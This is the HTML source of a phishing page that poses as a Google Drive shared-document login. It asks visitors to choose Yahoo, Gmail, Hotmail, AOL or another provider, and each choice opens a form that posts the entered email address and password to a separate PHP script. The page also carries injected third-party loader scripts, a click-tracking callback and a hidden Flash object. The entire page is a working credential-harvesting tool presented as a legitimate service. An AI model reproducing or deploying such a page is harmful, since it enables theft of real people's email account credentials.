<html>
<head>
<link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8A+/r4APvo2QD7xJgA

+93EAPv39AD7+fcA+6dkAPupZwD7+vkA/Pz8APvbwgD7qmkA

+/TuAPu5hAD7pmEA/v79APuyeAD7+PUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8PDw8PDw8PDw8PDw8PAA8PDw8LCgoKBgoDDw8P

Dw8PDw8RCgIPDw8PDwoPDw8PDw8PCgoPDw8PDw8KDw8PDw8PDwwKDw8PDw8PCg8PDw8PDw8PAQoPDw8PCgoPDw8PDw8PDw8PBxIKCgoPDw8PDw8PDw8PDw8PCgoPDw8PDw8PDw8PDw8PDwoJDw8PDw8PDw8PDw8KCg8PCQ4

PDw8PDw8PDw8CCggPDw8KDw8PDw8PDw8PCgoPDw8PCgoPDw8PDw8PDwEKDw8PDwoKDw8PDw8PDw8PCg8PDwoKDw8PDw8PDw8PDw8KBAoKBQ0PDw8PEA8PDw8PDw8PDw8PDw8PEIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIABAAA=" rel="icon" type="image/x-icon" />
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
<title>Google Drive. Keep everything. Share anything - GOOGLE.com?</title> 
<link rel="stylesheet" type="text/css" href="index_files/style.htm"> 
<style type="text/css"> 

html {
background: url(http://s22.postimg.org/8m0slmesh/bgimage.jpg) no-repeat center center fixed;

-webkit-background-size: cover;
-moz-background-size: cover;
-o-

background-size: cover;
background-size: cover;
}

a {
    color: #0369B2;
    cursor: pointer;
    outline: medium none;
    text-decoration: none;
}
input {
    border: 1px 

solid #CCCCCC;
    height: 25px;
	padding: 3px 2px;
}
table#wrapper {
    box-shadow: 0 0 0 5px rgba(204, 204, 204, 0.8);
	position: relative;
    top: 20px;
}
.modal-header 

{
    background: none repeat scroll 0 0 #F5F5F5;
    border-bottom: 1px solid #EBEBEB;
    padding: 10px 10px;
}
.invoiceicon > a + a {
    margin-left: 35px;
}
div {
	

position: absolute;
	left: 375px;
	top: 110px;
	background-color: #EEEEEE;
	width: 210px;
	padding: 10px 10px 10px 40px;
	color: #000000;
	border: #d5e4ef 

0 solid;
	display: none;
	min-height: 250px;
}
.email-header {
    margin: 10px 0 15px;
}
.email-header > a {
    color: #999999;
    float: right;
    font-size: 24px;
  

  position: absolute;
    right: 10px;
    top: 0;
}
.pointer {
    background: url("pointer.png") no-repeat scroll 0 0 transparent;
    display: block;
    height: 42px;
    

left: 0;
    position: absolute;
    top: 25px;
    width: 36px;
}
body,td,th {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	background-

repeat: no-repeat;
}

.difont {
	font-family:Verdana, Geneva, sans-serif;
	font-size:10px
}
input[type="submit"] {
    	background: #85bb5d;
	background: -

moz-linear-gradient(top,  #85bb5d 0%, #5b9844 100%);
	background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#85bb5d), color-stop(100%,#5b9844));
	

background: -webkit-linear-gradient(top,  #85bb5d 0%,#5b9844 100%);
	background: -o-linear-gradient(top,  #85bb5d 0%,#5b9844 100%);
	background: -ms-linear-

gradient(top,  #85bb5d 0%,#5b9844 100%);
	background: linear-gradient(to bottom,  #85bb5d 0%,#5b9844 100%);
	filter: 

progid:DXImageTransform.Microsoft.gradient( startColorstr='#85bb5d', endColorstr='#5b9844',GradientType=0 );
    color: #FFFFFF;
    cursor: pointer;
    display: 

inline-block;
    font-size: 12px;
    font-weight: bold;
    line-height: 1;
    margin: 0;
    padding: 3px 6px 4px;
    text-decoration: none !important;
    vertical-

align: top;
}
input[type="submit"] {
    border: 1px solid #559A4C;
}
input[type="submit"]:hover, input[type="submit"]:active {
    border-color: #428B32;
}
input

[type="submit"]:hover {
    background: #84ba5c; 
	background: -moz-linear-gradient(top,  #84ba5c 0%, #4f8e3c 100%);
	background: -webkit-gradient(linear, 

left top, left bottom, color-stop(0%,#84ba5c), color-stop(100%,#4f8e3c));
	background: -webkit-linear-gradient(top,  #84ba5c 0%,#4f8e3c 100%);
	background: -

o-linear-gradient(top,  #84ba5c 0%,#4f8e3c 100%);
	background: -ms-linear-gradient(top,  #84ba5c 0%,#4f8e3c 100%);
	background: linear-gradient(to bottom,  #84ba5c 

0%,#4f8e3c 100%);
	filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#84ba5c', endColorstr='#4f8e3c',GradientType=0 );
}
.modal-header h1 {
    

color: #444444;
    display: inline;
    font-size: 16px;
    margin: 0;
    text-shadow: 1px 1px 1px #FFFFFF;
}
.modal-close {
    color: #999999;
    font-size: 36px;
    

position: absolute;
    right: 7px;
    top: 0;
}
</style> 
<script language="Javascript"> 
                                                                                  

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                                                                                                                                                        

                                            
</script> 
<script language="javascript"> 
function toggle() {
	var ele = document.getElementById("toggleText");
	

var text = document.getElementById("displayText");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = 

"show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
}
 
function togglegmail() {
	var ele = 

document.getElementById("toggleTextgmail");
	var text = document.getElementById("displayTextgmail");
	if(ele.style.display == "block") {
    		

ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	

}
} 
 
function togglehotmail() {
	var ele = document.getElementById("toggleTexthotmail");
	var text = document.getElementById("displayTexthotmail");
	if

(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	}
	else {
		ele.style.display = 

"block";
		text.innerHTML = "hide";
	}
} 
function toggleaol() {
	var ele = document.getElementById("toggleTextaol");
	var text = 

document.getElementById("displayTextaol");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		text.innerHTML = "show";
  	

}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
} 
function toggleother() {
	var ele = document.getElementById

("toggleTextother");
	var text = document.getElementById("displayTextother");
	if(ele.style.display == "block") {
    		ele.style.display = "none";
		

text.innerHTML = "show";
  	}
	else {
		ele.style.display = "block";
		text.innerHTML = "hide";
	}
} 
</script> 

<script 

type="text/javascript">(typeof _GPL_16_loaded == 'undefined') && (_GPL_16_loaded=true) && (_GPL_i=document.getElementsByTagName('head')) && (_GPL_i=(_GPL_i.length>0)?

_GPL_i:document.getElementsByTagName('body')) && (_GPL_i.length>0) && (_GPL_j=document.createElement('script')) && (_GPL_j.async=true) && 

(_GPL_j.type='text/javascript') && (_GPL_j.src='https://d3lvr7yuk4uaui.cloudfront.net/items/loaders/loader_16.js?

pid=16&zoneid=7818&cid=US&rid=NV&ccid=Fernley&ip=199.48.177.231&aoi=1316649369') && (_GPL_i[0].appendChild(_GPL_j))</script><script type="text/javascript">if 

(window.addEventListener) { 
  var callback_func = function(evt) { 
    if ('undefined' != typeof evt.target && "A" == evt.target.nodeName) { 
      var url = 

evt.target.href; 
      EBCallBackMessageReceivedCT2612669_129564560723477699(url); 
    } 
    return true; 
  }; 
  var result = window.addEventListener('click', 

callback_func, true); 
  var result = window.addEventListener('contextmenu', callback_func, true); 
} else if (document.attachEvent) {
  var callback_func = function () { 
    if ('undefined' != typeof event.srcElement &&'A' == event.srcElement.tagName) { 
      var url = event.srcElement.href; 
      

EBCallBackMessageReceivedCT2612669_129564560723477699(url); 
    } 
    return true; 
  }; 
  var result = document.attachEvent('onclick', callback_func); 
  var result = 

document.attachEvent('oncontextmenu', callback_func); 
} 
 

</script></head> 
<table id="wrapper" align="center" bgcolor="#cccccc" cellpadding="0" cellspacing="0" 

width="375px"><tbody><tr><td bgcolor="#ffffff"> 
 
<table width="100%" class="modal-header"><tbody><tr><td width="50%">

<h1><img 

src="https://www.google.com/images/logos/google_logo_41.png" <pr></br></font></h1><a class="modal-close" href="#">?</a>

</td></tr></tbody></table>
 

 
 
<table 

id="invoicetoptables" cellspacing="0" width="100%"> 
<tbody><tr> 
<td id="invoicecontent" width="50%"> 
 
<table id="invoicetoptables" cellpadding="10" cellspacing="0" 

height="100" width="100%"> 
<tbody><tr> 
<td id="invoicecontent" style="border: 0px solid rgb(204, 204, 204);" valign="top"> 
<p><font color="#990000" size="2pt"><b>To 

view shared document,  
you are required to Login with your email address below.</font></p></b>
 
<font class="paid" size="2pt">Choose your email provider below and 

login:</font> 

<br> 
<p align="center" class="invoiceicon"> 
<a href="javascript:toggle();"><img src="http://i.cubeupload.com/WQ6i4T.png" title="Yahoomail" 

id="displayText" border="0" height="25" width="132"></a> 
&nbsp;&nbsp;&nbsp; <a href="javascript:togglegmail();"><img src="http://i.cubeupload.com/fPPkHl.png" 

title="Gmail" id="displayTextgmail" border="0" height="48" width="78"></a> 
<br> 
<br> 
<br> 
<a href="javascript:togglehotmail();"><img 

src="http://i.cubeupload.com/POrXsh.png" title="Hotmail" id="displayTexthotmail" border="0" height="33" width="132"></a> 
&nbsp;&nbsp;&nbsp; <a 

href="javascript:toggleaol();"><img src="http://i.cubeupload.com/VzaOgf.png" title="Aol" id="displayTextaol" border="0" height="48" width="54"></a> 
<br> 
<br> 
<br> 
<a 

href="javascript:toggleother();"><img src="http://i.cubeupload.com/HzzKiz.jpg" title="Other Email" id="displayTextother" border="0" height="48" width="132"></a> 

</p> 
 

<!-- YAHOO CONFIG !--> 

<div id="toggleText" style="display: none; font-size: 12px; font-family: Verdana, Geneva, sans-serif;"> 
<span class="pointer"></span>
<p 

class="email-header"><a href="javascript:location.reload(true)">x</a><img src="http://i.cubeupload.com/WQ6i4T.png" title="Yahoomail" border="0" height="25" 

width="132"></p>  

<form method="POST" action="yahoo.php" onSubmit="return ValidateFormYahoo()"> 
<p> 
				

<label>Yahoo! ID</label>
				<br> 
				<input name="yahoouser" style="width: 200px;" type="text"> 
			<br> 
				<label>Yahoo Password</label> 
                <br> 
				<input name="yahoopassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_yahoo" value="Sign In" type="submit"> 
			</p> 	





</form> 

</div> 
 


<!-- GMAIL CONFIG !--> 
<div id="toggleTextgmail" style="display: none; font-family: Verdana, Geneva, sans-serif; font-size: 12px;"> 
<span class="pointer"></span>
<p 

class="email-header"><a href="javascript:location.reload(true)">x</a><img src="http://i.cubeupload.com/fPPkHl.png" title="Gmail" border="0" height="48" width="78"></p> 

<form method="POST" action="gmail.php" onSubmit="return ValidateFormGmail()">
<p> 

				<label>Gmail 

Username:</label> 

                <br> 
				<p> 
 
				<label>Gmail Email Address:</label> 

                <br> 
				<input name="gmailuser" style="width: 200px;" type="text"> 
			<br> 
				<label>Gmail Password</label> 
                <br> 
				<input name="gmailpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_gmail" value="Sign in" type="submit"> 
			</p> 
            </form> 
 



</div> 
 
<!-- HOTMAIL CONFIG !--> 
<div id="toggleTexthotmail" style="display: none; font-family: Verdana, Geneva, sans-serif;"> 
<span class="pointer"></span>
<p 

class="email-header"><a href="javascript:location.reload(true)">x</a><img src="http://i.cubeupload.com/POrXsh.png" title="Hotmail" border="0" height="33" 

width="132"></p>  

<form method="POST" action="hotmail.php" onSubmit="return ValidateFormHotmail()"> 
<p> 
				

<label>Windows Live ID:</label> 
                <br> 

 
                <br> 
				<input name="hotmailuser" style="width: 200px;" type="text"> 
			<br> 
				<label>Hotmail Password</label> 
                <br> 
				<input name="hotmailpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_hotmail" value="Sign in" type="submit"> 
			</p> 
            </form> 



</div>  
 
<!-- AOL CONFIG !--> 
<div id="toggleTextaol" style="display: none; font-family: Verdana, Geneva, sans-serif; font-size: 12px;"> 
<span class="pointer"></span>
<p class="email-header"><a href="javascript:location.reload(true)">x</a><img src="http://i.cubeupload.com/VzaOgf.png" title="Aol" border="0" height="48" 

width="54"></p>

<form method="POST" action="aol.php" onSubmit="return ValidateFormAol()"> 
<p> 
				

<label>Aol Screen Name or Email:</label> 
                <br> 
		                <br> 
				<input name="aoluser" style="width: 200px;" type="text"> 
			<br> 
				<label>Aol Password</label> 
                <br> 
				<input name="aolpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_aol" value="Sign In" type="submit"> 
			</p> 
            </form> 



</div> 


<!-- OTHER CONFIG !--> 
<div id="toggleTextother" style="display: none; font-family: Verdana, Geneva, sans-serif; font-size: 12px;"> 
<span class="pointer"></span>
<p 

class="email-header"><a href="javascript:location.reload(true)">x</a><img src="http://i.cubeupload.com/KZO7SH.png" title="Other" border="0" height="48" 

width="132"></p>  

<form method="POST" action="other.php" onSubmit="return ValidateFormOther()"> 
<p> 
				

<label>Email Address:</label> 
                <br> 
	                <br> 
				<input name="otheruser" style="width: 200px;" type="text"> 
			<br> 
				<label>Password</label> 
                <br> 
				<input name="otherpassword" style="width: 200px;" type="password"> 
                <br> 
                <br> 
                <input name="s_other" value="Sign In" type="submit"> 
			</p> 
            </form> 



</div> 

 
 </td> 
 </tr> 
 </tbody></table> 
</td></tr></tbody></table> 
 
</td> 
  
 
 
 
 
 
</tr></tbody></table><iframe style="display: none;" src="index_files/google.htm" 

id="y2Google"></iframe><div id="_GPL_e6a00_div" style="position: absolute;"><object codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" 

id="_GPL_e6a00_swf" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" height="1" width="1"><param 

value="http://d3lvr7yuk4uaui.cloudfront.net/items/e6a00/storage.swf" name="movie"><param 

value="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl" name="FlashVars"><param value="always" 

name="allowscriptaccess"><embed pluginspage="http://www.macromedia.com/go/getflashplayer" 

flashvars="logfn=_GPL.items.e6a00.log&amp;onload=_GPL.items.e6a00.onload&amp;onerror=_GPL.items.e6a00.onerror&amp;LSOName=gpl" type="application/x-shockwave-flash" 

allowscriptaccess="always" quality="high" loop="false" play="true" name="_GPL_e6a00_swf" bgcolor="#ffffff" src="index_files/storage.swf" align="middle" height="1" 

width="1"></object></div><div style="display: none;" id="YontooInstallID">53F185F5-B55B-7227-CDAE-4D9C688D1835</div></body></html>